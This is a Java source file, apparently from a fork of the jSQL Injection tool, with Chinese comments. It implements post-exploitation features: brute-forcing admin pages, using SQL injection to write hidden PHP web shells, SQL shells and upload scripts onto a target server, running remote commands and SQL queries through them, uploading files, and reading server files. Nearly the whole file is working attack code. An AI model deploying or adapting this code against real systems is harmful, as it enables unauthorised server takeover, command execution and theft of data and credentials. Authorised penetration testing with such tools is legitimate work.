package com.jsql.model.accessible;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Collections;
import java.util.EnumMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.lang3.StringUtils;
import org.apache.log4j.Logger;

import com.jsql.i18n.I18n;
import com.jsql.model.InjectionModel;
import com.jsql.model.MediatorModel;
import com.jsql.model.bean.excel.ExcelUrlBean;
import com.jsql.model.bean.util.Header;
import com.jsql.model.bean.util.Interaction;
import com.jsql.model.bean.util.Request;
import com.jsql.model.exception.InjectionFailureException;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.suspendable.SuspendableGetRows;
import com.jsql.model.suspendable.callable.ThreadFactoryCallable;
import com.jsql.util.ConnectionUtil;
import com.jsql.util.HeaderUtil;
import com.jsql.view.scan.ScanListTerminal;
import com.jsql.view.swing.MediatorGui;
import com.jsql.view.swing.list.ItemList;
import com.jsql.view.swing.list.ItemListScan;
import com.jsql.view.swing.menubar.Menubar;
import com.jsql.view.swing.panel.PanelAddressBar;

/**
 * 资源访问对象，从文件系统，命令，网页获取信息。
 */
public class RessourceAccess {

	private static final Logger LOGGER = Logger.getRootLogger();

	/**
	 * Web Shell的文件名。
	 */
	public final String filenameWebshell;

	/**
	 * sql shell的文件名。
	 */
	public final String filenameSqlshell;

	/**
	 * 上传表单的文件名。
	 */
	public final String filenameUpload;

	/**
	 * 如果管理页面停止，则为true，否则为false。
	 */
	private boolean isSearchAdminStopped = false;

	/**
	 * 如果扫描列表已停止，则为true，否则为false。
	 */
	private boolean isScanStopped = false;

	/**
	 * 如果必须停止正在进行的文件读取，则为true，否则为false。 如果为true，则会在开始时取消任何新文件读取。
	 */
	private boolean isSearchFileStopped = false;

	/**
	 * 如果当前用户有权读取文件，则为True。
	 */
	private boolean readingIsAllowed = false;

	/**
	 * 正在进行的任务集合
	 */
	private List<CallableFile> callablesReadFile = new ArrayList<>();

	private InjectionModel injectionModel;

	public RessourceAccess(InjectionModel injectionModel) {
		this.injectionModel = injectionModel;

		this.filenameWebshell = "..jw.php";
		this.filenameSqlshell = ".js.php";
		this.filenameUpload = ".ju.php";

	}

	/**
	 * 检查列表中的每个页面是否响应200 Success。
	 * 
	 * @param urlInjection
	 * @param pageNames    List of admin pages ot test
	 * @throws InterruptedException
	 */
	public void createAdminPages(String urlInjection, List<ItemList> pageNames) throws InterruptedException {
		String urlWithoutProtocol = urlInjection.replaceAll("^https?://[^/]*", "");
		String urlProtocol = urlInjection.replace(urlWithoutProtocol, "");
		String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", "");

		List<String> directoryNames = new ArrayList<>();
		if (urlWithoutFileName.split("/").length == 0) {
			directoryNames.add("/");
		}
		for (String directoryName : urlWithoutFileName.split("/")) {
			directoryNames.add(directoryName + "/");
		}

		ExecutorService taskExecutor = Executors.newFixedThreadPool(10,
				new ThreadFactoryCallable("CallableGetAdminPage"));
		CompletionService<CallableHttpHead> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);

		StringBuilder urlPart = new StringBuilder();
		for (String segment : directoryNames) {
			urlPart.append(segment);
			for (ItemList pageName : pageNames) {
				taskCompletionService.submit(new CallableHttpHead(
						urlProtocol + urlPart.toString() + pageName.toString(), this.injectionModel));
			}
		}

		int nbAdminPagesFound = 0;
		int submittedTasks = directoryNames.size() * pageNames.size();
		int tasksHandled;
		for (tasksHandled = 0; tasksHandled < submittedTasks && !this.isSearchAdminStopped; tasksHandled++) {
			try {
				CallableHttpHead currentCallable = taskCompletionService.take().get();
				if (currentCallable.isHttpResponseOk()) {
					Request request = new Request();
					request.setMessage(Interaction.CREATE_ADMIN_PAGE_TAB);
					request.setParameters(currentCallable.getUrl());
					this.injectionModel.sendToViews(request);

					nbAdminPagesFound++;
					LOGGER.debug("Found admin page: " + currentCallable.getUrl());
				}
			} catch (InterruptedException | ExecutionException e) {
				LOGGER.error("Interruption while checking Admin pages", e);
				Thread.currentThread().interrupt();
			}
		}

		taskExecutor.shutdown();
		taskExecutor.awaitTermination(5, TimeUnit.SECONDS);

		this.isSearchAdminStopped = false;

		String result = "Found " + nbAdminPagesFound + " admin page" + (nbAdminPagesFound > 1 ? 's' : "") + " "
				+ (tasksHandled != submittedTasks ? "of " + tasksHandled + " processed " : "") + "on " + submittedTasks
				+ " page" + (submittedTasks > 1 ? 's' : "") + " searched";
		if (nbAdminPagesFound > 0) {
			LOGGER.debug(result);
		} else {
			LOGGER.warn(result);
		}

		Request request = new Request();
		request.setMessage(Interaction.END_ADMIN_SEARCH);
		this.injectionModel.sendToViews(request);
	}

	/**
	 * 在服务器中创建一个Webshell。
	 * 
	 * @param pathShell Remote path othe file
	 * @param url
	 * @throws InterruptedException
	 * @throws InjectionFailureException
	 * @throws StoppedByUserSlidingException
	 */
	public void createWebShell(String pathShell, String urlShell) throws JSqlException, InterruptedException {
		if (!this.isReadingAllowed()) {
			return;
		}

		String sourceShellToInject = this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties()
				.getProperty("shell.web").replace(DataAccess.LEAD_IN_SHELL, DataAccess.LEAD)
				.replace(DataAccess.TRAIL_IN_SHELL, DataAccess.TRAIL);

		String pathShellFixed = pathShell;
		if (!pathShellFixed.matches(".*/$")) {
			pathShellFixed += "/";
		}
		this.injectionModel.injectWithoutIndex(this.injectionModel.getMediatorVendor().getVendor().instance()
				.sqlTextIntoFile(sourceShellToInject, pathShellFixed + this.filenameWebshell));

		String resultInjection;
		String[] sourcePage = { "" };
		try {
			resultInjection = new SuspendableGetRows(this.injectionModel).run(this.injectionModel.getMediatorVendor()
					.getVendor().instance().sqlFileRead(pathShellFixed + this.filenameWebshell), sourcePage, false, 1,
					null);

			if ("".equals(resultInjection)) {
				throw new JSqlException("payload integrity verification: Empty payload");
			}
		} catch (JSqlException e) {
			throw new JSqlException("injected payload does not match source", e);
		}

		if (!urlShell.isEmpty()) {
			urlShell = urlShell.replaceAll("/*$", "") + "/";
		}

		String url = urlShell;
		if ("".equals(url)) {
			url = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase();
		}

		if (resultInjection.indexOf(sourceShellToInject) > -1) {
			LOGGER.debug("Web payload created into \"" + pathShellFixed + this.filenameWebshell + "\"");
			//
			String urlWithoutProtocol = url.replaceAll("^https?://[^/]*", "");

			String urlProtocol;
			if ("/".equals(urlWithoutProtocol)) {
				urlProtocol = url.replaceAll("/+$", "");
			} else {
				urlProtocol = url.replace(urlWithoutProtocol, "");
			}

			String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", "").replaceAll("/+", "/");

			List<String> directoryNames = new ArrayList<>();
			if (urlWithoutFileName.split("/").length == 0) {
				directoryNames.add("/");
			}
			for (String directoryName : urlWithoutFileName.split("/")) {
				directoryNames.add(directoryName + "/");
			}

			ExecutorService taskExecutor = Executors.newFixedThreadPool(10,
					new ThreadFactoryCallable("CallableCreateWebShell"));
			CompletionService<CallableHttpHead> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);

			StringBuilder urlPart = new StringBuilder();
			for (String segment : directoryNames) {
				urlPart.append(segment);
				taskCompletionService.submit(new CallableHttpHead(
						urlProtocol + urlPart.toString() + this.filenameWebshell, this.injectionModel));
			}

			int submittedTasks = directoryNames.size() * 1;
			int tasksHandled;
			String urlSuccess = null;
			for (tasksHandled = 0; tasksHandled < submittedTasks; tasksHandled++) {
				try {
					CallableHttpHead currentCallable = taskCompletionService.take().get();

					if (currentCallable.isHttpResponseOk()) {
						urlSuccess = currentCallable.getUrl();

						if (!urlShell.isEmpty() && urlSuccess.replace(this.filenameWebshell, "").equals(urlShell)
								|| urlSuccess.replace(this.filenameWebshell, "")
										.equals(urlProtocol + urlWithoutFileName)) {
							LOGGER.debug("Connection to payload found at expected location \"" + urlSuccess + "\"");
						} else {
							LOGGER.debug("Connection to payload found at unexpected location \"" + urlSuccess + "\"");
						}
					} else {
						LOGGER.trace("Connection to payload not found at \"" + currentCallable.getUrl() + "\"");
					}
				} catch (InterruptedException | ExecutionException e) {
					LOGGER.error("Interruption while checking Web shell", e);
					Thread.currentThread().interrupt();
				}
			}

			taskExecutor.shutdown();
			taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
			//

			if (urlSuccess != null) {
				Request request = new Request();
				request.setMessage(Interaction.CREATE_SHELL_TAB);
				request.setParameters(pathShellFixed.replace(this.filenameWebshell, ""), urlSuccess);
				this.injectionModel.sendToViews(request);
			} else {
				LOGGER.warn("HTTP connection to Web payload not found");
			}
		} else {
			throw new JSqlException(
					"Incorrect Web payload integrity: " + sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"));
		}
	}

	/**
	 * 
	 * @param urlCommand
	 * @return
	 * @throws IOException
	 */
	private String runCommandShell(String urlCommand) throws IOException {
		HttpURLConnection connection;

		String url = urlCommand;
		connection = (HttpURLConnection) new URL(url).openConnection();
		connection.setReadTimeout(this.injectionModel.getMediatorUtils().getConnectionUtil().getTimeout());
		connection.setConnectTimeout(this.injectionModel.getMediatorUtils().getConnectionUtil().getTimeout());

		String pageSource = null;
		try {
			pageSource = ConnectionUtil.getSource(connection);
		} catch (Exception e) {
			pageSource = "";
		}

		Matcher regexSearch = Pattern.compile("(?s)<" + DataAccess.LEAD + ">(.*)<" + DataAccess.TRAIL + ">")
				.matcher(pageSource);
		regexSearch.find();

		String result;
		// IllegalStateException #1544: catch incorrect execution
		try {
			result = regexSearch.group(1);
		} catch (IllegalStateException e) {
			// Fix return null from regex
			result = "";
			LOGGER.warn("Incorrect response from Web shell", e);
		}

		Map<Header, Object> msgHeader = new EnumMap<>(Header.class);
		msgHeader.put(Header.URL, url);
		msgHeader.put(Header.POST, "");
		msgHeader.put(Header.HEADER, "");
		msgHeader.put(Header.RESPONSE, HeaderUtil.getHttpHeaders(connection));
		msgHeader.put(Header.SOURCE, pageSource);

		Request request = new Request();
		request.setMessage(Interaction.MESSAGE_HEADER);
		request.setParameters(msgHeader);
		this.injectionModel.sendToViews(request);

		// TODO optional
		return result;
	}

	/**
	 * 在主机上运行shell命令。
	 * 
	 * @param command   The command to execute
	 * @param uuidShell An unique identifier for terminal
	 * @param urlShell  Web path of the shell
	 */
	public void runWebShell(String command, UUID uuidShell, String urlShell) {
		String result = "";

		try {
			result = this.runCommandShell(urlShell + "?c=" + URLEncoder.encode(command.trim(), "ISO-8859-1"));

			if ("".equals(result)) {
				result = "No result.\nTry \"" + command.trim() + " 2>&1\" to get a system error message.\n";
			}
		} catch (UnsupportedEncodingException e) {
			LOGGER.warn("Encoding command to ISO-8859-1 failed: " + e.getMessage(), e);
		} catch (IOException e) {
			LOGGER.warn("Shell execution error: " + e.getMessage(), e);
		} finally {
			// Unfroze interface
			Request request = new Request();
			request.setMessage(Interaction.GET_WEB_SHELL_RESULT);
			request.setParameters(uuidShell, result);
			this.injectionModel.sendToViews(request);
		}
	}

	/**
	 * 在服务器上创建SQL Shell。 最终将覆盖用户名和密码
	 * 
	 * @param pathShell Script to create on the server
	 * @param url       URL for the script (used for url rewriting)
	 * @param username  User name for current database
	 * @param password  User password for current database
	 * @throws InterruptedException
	 * @throws InjectionFailureException
	 * @throws StoppedByUserSlidingException
	 */
	public void createSqlShell(String pathShell, String urlShell, String username, String password)
			throws JSqlException, InterruptedException {
		if (!this.isReadingAllowed()) {
			return;
		}

		String sourceShellToInject = this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties()
				.getProperty("shell.sql").replace(DataAccess.LEAD_IN_SHELL, DataAccess.LEAD)
				.replace(DataAccess.TRAIL_IN_SHELL, DataAccess.TRAIL);

		String pathShellFixed = pathShell;
		if (!pathShellFixed.matches(".*/$")) {
			pathShellFixed += "/";
		}
		this.injectionModel.injectWithoutIndex(this.injectionModel.getMediatorVendor().getVendor().instance()
				.sqlTextIntoFile(sourceShellToInject, pathShellFixed + this.filenameSqlshell));

		String resultInjection;
		String[] sourcePage = { "" };
		try {
			resultInjection = new SuspendableGetRows(this.injectionModel).run(this.injectionModel.getMediatorVendor()
					.getVendor().instance().sqlFileRead(pathShellFixed + this.filenameSqlshell), sourcePage, false, 1,
					null);

			if ("".equals(resultInjection)) {
				throw new JSqlException("payload integrity verification: Empty payload");
			}
		} catch (JSqlException e) {
			throw new JSqlException("injected payload does not match source", e);
		}

		if (!urlShell.isEmpty()) {
			urlShell = urlShell.replaceAll("/*$", "") + "/";
		}

		String url = urlShell;
		if ("".equals(url)) {
			url = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase();
		}

		if (resultInjection.indexOf(sourceShellToInject) > -1) {
			LOGGER.debug("SQL payload created into \"" + pathShellFixed + this.filenameSqlshell + "\"");
			//
			String urlWithoutProtocol = url.replaceAll("^https?://[^/]*", "");

			String urlProtocol;
			if ("/".equals(urlWithoutProtocol)) {
				urlProtocol = url.replaceAll("/+$", "");
			} else {
				urlProtocol = url.replace(urlWithoutProtocol, "");
			}

			String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", "").replaceAll("/+", "/");

			List<String> directoryNames = new ArrayList<>();
			if (urlWithoutFileName.split("/").length == 0) {
				directoryNames.add("/");
			}
			for (String directoryName : urlWithoutFileName.split("/")) {
				directoryNames.add(directoryName + "/");
			}

			ExecutorService taskExecutor = Executors.newFixedThreadPool(10,
					new ThreadFactoryCallable("CallableCreateSqlShell"));
			CompletionService<CallableHttpHead> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);

			StringBuilder urlPart = new StringBuilder();
			for (String segment : directoryNames) {
				urlPart.append(segment);
				taskCompletionService.submit(new CallableHttpHead(
						urlProtocol + urlPart.toString() + this.filenameSqlshell, this.injectionModel));
			}

			int submittedTasks = directoryNames.size() * 1;
			int tasksHandled;
			String urlSuccess = null;
			for (tasksHandled = 0; tasksHandled < submittedTasks; tasksHandled++) {
				try {
					CallableHttpHead currentCallable = taskCompletionService.take().get();

					if (currentCallable.isHttpResponseOk()) {
						urlSuccess = currentCallable.getUrl();

						if (!urlShell.isEmpty() && urlSuccess.replace(this.filenameSqlshell, "").equals(urlShell)
								|| urlSuccess.replace(this.filenameSqlshell, "")
										.equals(urlProtocol + urlWithoutFileName)) {
							LOGGER.debug("Connection to payload found at expected location \"" + urlSuccess + "\"");
						} else {
							LOGGER.debug("Connection to payload found at unexpected location \"" + urlSuccess + "\"");
						}
					} else {
						LOGGER.trace("Connection to payload not found at \"" + currentCallable.getUrl() + "\"");
					}
				} catch (InterruptedException | ExecutionException e) {
					LOGGER.error("Interruption while checking SQL shell", e);
					Thread.currentThread().interrupt();
				}
			}

			taskExecutor.shutdown();
			taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
			//

			if (urlSuccess != null) {
				Request request = new Request();
				request.setMessage(Interaction.CREATE_SQL_SHELL_TAB);
				request.setParameters(pathShellFixed.replace(this.filenameSqlshell, ""), urlSuccess, username,
						password);
				this.injectionModel.sendToViews(request);
			} else {
				LOGGER.warn("HTTP connection to SQL payload not found");
			}
		} else {
			throw new JSqlException(
					"Incorrect SQL payload integrity: " + sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"));
		}
	}

	/**
	 * 将SQL请求执行到由URL路径定义的终端中，最终用数据库用户/传递标识符覆盖。
	 * 
	 * @param command   SQL request to execute
	 * @param uuidShell Identifier of terminal sending the request
	 * @param urlShell  URL to send SQL request against
	 * @param username  User name [optional]
	 * @param password  USEr password [optional]
	 */
	public void runSqlShell(String command, UUID uuidShell, String urlShell, String username, String password) {
		String result = "";
		try {
			result = this.runCommandShell(urlShell + "?q=" + URLEncoder.encode(command.trim(), "ISO-8859-1") + "&u="
					+ username + "&p=" + password);

			if (result.indexOf("<SQLr>") > -1) {
				List<List<String>> listRows = new ArrayList<>();
				Matcher rowsMatcher = Pattern.compile("(?si)<tr>(<td>.*?</td>)</tr>").matcher(result);
				while (rowsMatcher.find()) {
					String values = rowsMatcher.group(1);

					Matcher fieldsMatcher = Pattern.compile("(?si)<td>(.*?)</td>").matcher(values);
					List<String> listFields = new ArrayList<>();
					listRows.add(listFields);
					while (fieldsMatcher.find()) {
						String field = fieldsMatcher.group(1);
						listFields.add(field);
					}
				}

				if (!listRows.isEmpty()) {
					List<Integer> listFieldsLength = new ArrayList<>();
					for (final int[] indexLongestRowSearch = { 0 }; indexLongestRowSearch[0] < listRows.get(0)
							.size(); indexLongestRowSearch[0]++) {
						Collections.sort(listRows,
								(firstRow, secondRow) -> secondRow.get(indexLongestRowSearch[0]).length()
										- firstRow.get(indexLongestRowSearch[0]).length());

						listFieldsLength.add(listRows.get(0).get(indexLongestRowSearch[0]).length());
					}

					if (!"".equals(result)) {
						StringBuilder tableText = new StringBuilder("+");
						for (Integer fieldLength : listFieldsLength) {
							tableText.append("-" + StringUtils.repeat("-", fieldLength) + "-+");
						}
						tableText.append("\n");

						for (List<String> listFields : listRows) {
							tableText.append("|");
							int cursorPosition = 0;
							for (String field : listFields) {
								tableText.append(" " + field
										+ StringUtils.repeat(" ", listFieldsLength.get(cursorPosition) - field.length())
										+ " |");
								cursorPosition++;
							}
							tableText.append("\n");
						}

						tableText.append("+");
						for (Integer fieldLength : listFieldsLength) {
							tableText.append("-" + StringUtils.repeat("-", fieldLength) + "-+");
						}
						tableText.append("\n");

						result = tableText.toString();
					}
				}
			} else if (result.indexOf("<SQLm>") > -1) {
				result = result.replace("<SQLm>", "") + "\n";
			} else if (result.indexOf("<SQLe>") > -1) {
				result = result.replace("<SQLe>", "") + "\n";
			}
		} catch (UnsupportedEncodingException e) {
			LOGGER.warn("Encoding command to ISO-8859-1 failed: " + e.getMessage(), e);
		} catch (IOException e) {
			LOGGER.warn("Shell execution error: " + e.getMessage(), e);
		} finally {
			// Unfroze interface
			Request request = new Request();
			request.setMessage(Interaction.GET_SQL_SHELL_RESULT);
			request.setParameters(uuidShell, result, command);
			this.injectionModel.sendToViews(request);
		}
	}

	/**
	 * 将文件上传到服务器.
	 * 
	 * @param pathFile Remote path of the file to upload
	 * @param urlFile  URL of uploaded file
	 * @param file     File to upload
	 * @throws JSqlException
	 * @throws IOException
	 */
	public void uploadFile(String pathFile, String urlFile, File file) throws JSqlException, IOException {
		if (!this.isReadingAllowed()) {
			return;
		}

		String sourceShellToInject = this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties()
				.getProperty("shell.upload").replace(DataAccess.LEAD_IN_SHELL, DataAccess.LEAD);

		String pathShellFixed = pathFile;
		if (!pathShellFixed.matches(".*/$")) {
			pathShellFixed += "/";
		}

		this.injectionModel.injectWithoutIndex(this.injectionModel.getMediatorVendor().getVendor().instance()
				.sqlTextIntoFile("<" + DataAccess.LEAD + ">" + sourceShellToInject + "<" + DataAccess.TRAIL + ">",
						pathShellFixed + this.filenameUpload));

		String[] sourcePage = { "" };
		String sourceShellInjected;
		try {
			sourceShellInjected = new SuspendableGetRows(this.injectionModel).run(this.injectionModel
					.getMediatorVendor().getVendor().instance().sqlFileRead(pathShellFixed + this.filenameUpload),
					sourcePage, false, 1, null);

			if ("".equals(sourceShellInjected)) {
				throw new JSqlException("Bad payload integrity: Empty payload");
			}
		} catch (JSqlException e) {
			throw new JSqlException(
					"Payload integrity verification failed: " + sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"), e);
		}

		String urlFileFixed = urlFile;
		if ("".equals(urlFileFixed)) {
			urlFileFixed = this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase().substring(0,
					this.injectionModel.getMediatorUtils().getConnectionUtil().getUrlBase().lastIndexOf('/') + 1);
		}

		if (sourceShellInjected.indexOf(sourceShellToInject) > -1) {
			LOGGER.debug("Upload payload deployed at \"" + urlFileFixed + this.filenameUpload + "\" in \""
					+ pathShellFixed + this.filenameUpload + "\"");

			String crLf = "\r\n";

			URL urlUploadShell = new URL(urlFileFixed + "/" + this.filenameUpload);
			URLConnection connection = urlUploadShell.openConnection();
			connection.setDoOutput(true);

			try (InputStream streamToUpload = new FileInputStream(file);) {

				byte[] streamData = new byte[streamToUpload.available()];
				if (streamToUpload.read(streamData) == -1) {
					throw new JSqlException("Error reading the file");
				}

				String headerForm = "";
				headerForm += "-----------------------------4664151417711" + crLf;
				headerForm += "Content-Disposition: form-data; name=\"u\"; filename=\"" + file.getName() + "\"" + crLf;
				headerForm += "Content-Type: binary/octet-stream" + crLf;
				headerForm += crLf;

				String headerFile = "";
				headerFile += crLf + "-----------------------------4664151417711--" + crLf;

				connection.setRequestProperty("Content-Type",
						"multipart/form-data; boundary=---------------------------4664151417711");
				connection.setRequestProperty("Content-Length",
						String.valueOf(headerForm.length() + headerFile.length() + streamData.length));

				try (OutputStream streamOutputFile = connection.getOutputStream();) {
					streamOutputFile.write(headerForm.getBytes());

					int index = 0;
					int size = 1024;
					do {
						if (index + size > streamData.length) {
							size = streamData.length - index;
						}
						streamOutputFile.write(streamData, index, size);
						index += size;
					} while (index < streamData.length);

					streamOutputFile.write(headerFile.getBytes());
					streamOutputFile.flush();
				}

				try (InputStream streamInputFile = connection.getInputStream();) {
					char buff = 512;
					int len;
					byte[] data = new byte[buff];
					StringBuilder result = new StringBuilder();
					do {
						len = streamInputFile.read(data);

						if (len > 0) {
							result.append(new String(data, 0, len));
						}
					} while (len > 0);

					if (result.indexOf(DataAccess.LEAD + "y") > -1) {
						LOGGER.debug("File \"" + file.getName() + "\" uploaded into \"" + pathShellFixed + "\"");
					} else {
						LOGGER.warn("Upload file \"" + file.getName() + "\" into \"" + pathShellFixed + "\" failed");
					}

					Map<Header, Object> msgHeader = new EnumMap<>(Header.class);
					msgHeader.put(Header.URL, urlFileFixed);
					msgHeader.put(Header.POST, "");
					msgHeader.put(Header.HEADER, "");
					msgHeader.put(Header.RESPONSE, HeaderUtil.getHttpHeaders(connection));
					msgHeader.put(Header.SOURCE, result.toString());

					Request request = new Request();
					request.setMessage(Interaction.MESSAGE_HEADER);
					request.setParameters(msgHeader);
					this.injectionModel.sendToViews(request);
				}
			}
		} else {
			throw new JSqlException(
					"Incorrect Upload payload integrity: " + sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"));
		}

		Request request = new Request();
		request.setMessage(Interaction.END_UPLOAD);
		this.injectionModel.sendToViews(request);
	}

	/**
	 * 检查当前用户是否可以读取文件。
	 * 
	 * @return True if user can read file, false otherwise
	 * @throws JSqlException when an error occurs during injection
	 */
	public boolean isReadingAllowed() throws JSqlException {
		// Unsupported Reading file when <file> is not present in current xmlModel
		// Fix #41055: NullPointerException on getFile()
		if (this.injectionModel.getMediatorVendor().getVendor().instance().getModelYaml().getResource()
				.getFile() == null) {
			LOGGER.warn("Reading file on " + this.injectionModel.getMediatorVendor().getVendor()
					+ " is currently not supported");
			return false;
		}

		String[] sourcePage = { "" };

		String resultInjection = new SuspendableGetRows(this.injectionModel).run(
				this.injectionModel.getMediatorVendor().getVendor().instance().sqlPrivilegeTest(), sourcePage, false, 1,
				null);

		if ("".equals(resultInjection)) {
			this.injectionModel.sendResponseFromSite("Can't read privilege", sourcePage[0].trim());
			Request request = new Request();
			request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);
			this.injectionModel.sendToViews(request);
			this.readingIsAllowed = false;
		} else if ("false".equals(resultInjection)) {
			LOGGER.warn("Privilege FILE is not granted to current user, files can't be read");
			Request request = new Request();
			request.setMessage(Interaction.MARK_FILE_SYSTEM_INVULNERABLE);
			this.injectionModel.sendToViews(request);
			this.readingIsAllowed = false;
		} else {
			Request request = new Request();
			request.setMessage(Interaction.MARK_FILE_SYSTEM_VULNERABLE);
			this.injectionModel.sendToViews(request);
			this.readingIsAllowed = true;
		}

		// TODO optional
		return this.readingIsAllowed;
	}

	/**
	 * 尝试使用注入方式从网站路径并行读取文件。 读取文件需要在服务器上有一个FILE。 用户可以随时中断该过程。
	 * 
	 * @param pathsFiles List of file paths to read
	 * @throws JSqlException        when an error occurs during injection
	 * @throws InterruptedException if the current thread was interrupted while
	 *                              waiting
	 * @throws ExecutionException   if the computation threw an exception
	 */
	public void readFile(List<ItemList> pathsFiles) throws JSqlException, InterruptedException, ExecutionException {
		if (!this.isReadingAllowed()) {
			return;
		}

		int countFileFound = 0;
		ExecutorService taskExecutor = Executors.newFixedThreadPool(10, new ThreadFactoryCallable("CallableReadFile"));
		CompletionService<CallableFile> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);

		for (ItemList pathFile : pathsFiles) {
			CallableFile callableFile = new CallableFile(pathFile.toString(), this.injectionModel);
			taskCompletionService.submit(callableFile);
			this.callablesReadFile.add(callableFile);
		}

		List<String> duplicate = new ArrayList<>();
		int submittedTasks = pathsFiles.size();
		int tasksHandled;
		for (tasksHandled = 0; tasksHandled < submittedTasks && !this.isSearchFileStopped; tasksHandled++) {
			CallableFile currentCallable = taskCompletionService.take().get();
			if (!"".equals(currentCallable.getSourceFile())) {
				String name = currentCallable.getPathFile().substring(
						currentCallable.getPathFile().lastIndexOf('/') + 1, currentCallable.getPathFile().length());
				String content = currentCallable.getSourceFile();
				String path = currentCallable.getPathFile();

				Request request = new Request();
				request.setMessage(Interaction.CREATE_FILE_TAB);
				request.setParameters(name, content, path);
				this.injectionModel.sendToViews(request);

				if (!duplicate.contains(path.replace(name, ""))) {
					LOGGER.info("Shell might be possible in folder " + path.replace(name, ""));
				}
				duplicate.add(path.replace(name, ""));

				countFileFound++;
			}
		}

		// Force ongoing suspendables to stop immediately
		for (CallableFile callableReadFile : this.callablesReadFile) {
			callableReadFile.getSuspendableReadFile().stop();
		}
		this.callablesReadFile.clear();

		taskExecutor.shutdown();
		taskExecutor.awaitTermination(5, TimeUnit.SECONDS);

		this.isSearchFileStopped = false;

		String result = "Found " + countFileFound + " file" + (countFileFound > 1 ? 's' : "") + " "
				+ (tasksHandled != submittedTasks ? "of " + tasksHandled + " processed " : "") + "on " + submittedTasks
				+ " files checked";
		if (countFileFound > 0) {
			LOGGER.debug(result);
		} else {
			LOGGER.warn(result);
		}

		Request request = new Request();
		request.setMessage(Interaction.END_FILE_SEARCH);
		this.injectionModel.sendToViews(request);
	}

	/**
	 * 依次开始快速扫描URL并显示结果。 定义任何现有视图并插入类似控制台的视图，以便用简单的文本结果而不是响应GUI消息 在多网站注入期间构建复杂的图形组件。
	 * 在扫描结束时，它将再次插入普通视图。
	 * 
	 * @param urlList contains a list of String URL
	 */
	public void scanList(List<ItemList> urlList) {
		// 清除先前注入中视图中的所有内容
		Request requests = new Request();
		requests.setMessage(Interaction.RESET_INTERFACE);
		this.injectionModel.sendToViews(requests);

		// 等待两次注入之间正在进行的交互作用结束
//        try {
//            Thread.sleep(500);
//        } catch (InterruptedException e) {
//            LOGGER.error("Interruption while sleeping during scan", e);
//            Thread.currentThread().interrupt();
//        }

		// 仅在控制台中显示结果
		this.injectionModel.deleteObservers();
		this.injectionModel.addObserver(new ScanListTerminal());		

		this.injectionModel.setIsScanning(true);
		this.isScanStopped = false;

		for (ItemList url : urlList) {
			ItemListScan urlurl = (ItemListScan) url;
			if (this.injectionModel.isStoppedByUser() || this.isScanStopped) {
				break;
			}
			LOGGER.info("Scanning " + urlurl.getBeanInjection().getUrl());
			this.injectionModel.controlInput(urlurl.getBeanInjection().getUrl(), urlurl.getBeanInjection().getRequest(),
					urlurl.getBeanInjection().getHeader(), urlurl.getBeanInjection().getInjectionTypeAsEnum(),
					urlurl.getBeanInjection().getRequestType(), true);

//            try {
//                Thread.sleep(500);
//            } catch (InterruptedException e) {
//                LOGGER.error("Interruption while sleeping between two scans", e);
//                Thread.currentThread().interrupt();
//            }
		}

		// 恢复正常视图
		// TODO Don't play with View on Model
		this.injectionModel.addObserver(MediatorGui.frame().getObserver());

		this.injectionModel.setIsScanning(false);
		this.injectionModel.setIsStoppedByUser(false);
		this.isScanStopped = false;

		Request request = new Request();
		request.setMessage(Interaction.END_SCAN);
		this.injectionModel.sendToViews(request);

		List<ExcelUrlBean> list = Menubar.list;
		if (list != null && list.size() > 0) {
			Menubar.list.remove(0);
			if(Menubar.list.size()>0) {
				Request request2 = new Request();
				request2.setParameters(list.get(0).getUrl());
				request2.setMessage(Interaction.NEXT_SCAN);
				this.injectionModel.sendToViews(request2);
			}else {
				MediatorModel.model().setBatchScan(false);
			}
		}else {
			MediatorModel.model().setBatchScan(false);
		}

	}

	/**
	 * 将文件搜索标记为停止。任何正在进行的文件读取都会中断，并且任何新文件都会读取 取消。
	 */
	public void stopSearchingFile() {
		this.isSearchFileStopped = true;

		// Force ongoing suspendable to stop immediately
		for (CallableFile callable : this.callablesReadFile) {
			callable.getSuspendableReadFile().stop();
		}
	}

	// Getters and setters

	public boolean isSearchAdminStopped() {
		return this.isSearchAdminStopped;
	}

	public void setSearchAdminStopped(boolean isSearchAdminStopped) {
		this.isSearchAdminStopped = isSearchAdminStopped;
	}

	public void setScanStopped(boolean isScanStopped) {
		this.isScanStopped = isScanStopped;
	}

	public boolean isReadingIsAllowed() {
		return this.readingIsAllowed;
	}

	public void setReadingIsAllowed(boolean readingIsAllowed) {
		this.readingIsAllowed = readingIsAllowed;
	}

}
